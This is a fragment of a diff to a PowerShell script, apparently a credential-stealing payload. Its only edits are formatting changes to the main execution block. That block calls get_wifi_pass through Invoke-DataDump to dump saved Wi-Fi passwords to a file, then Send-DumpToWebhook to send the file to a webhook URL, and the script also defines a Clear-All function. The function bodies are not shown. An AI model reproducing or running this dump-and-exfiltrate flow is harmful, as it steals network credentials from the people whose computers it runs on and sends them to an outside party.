@@ -291,6 +291,7 @@ SSD >> PWD
     return $OutputFile
 }
 
+
 function send_file_to_webhook {
     [CmdletBinding()]
     param(
@@ -459,7 +460,11 @@ function Clear-All {
 }
 
 #### Executa ####
-$out = Invoke-DataDump -DumpCommand { get_wifi_pass -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault
+$out = Invoke-DataDump `
+    -DumpCommand { get_wifi_pass -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
+    -OutputFile $OutputFileDefault `
+    -ExportDir $ExportDirDefault
+
 Send-DumpToWebhook `
     -FilePath $out `
     -WebhookUrl $WebhookUrl `
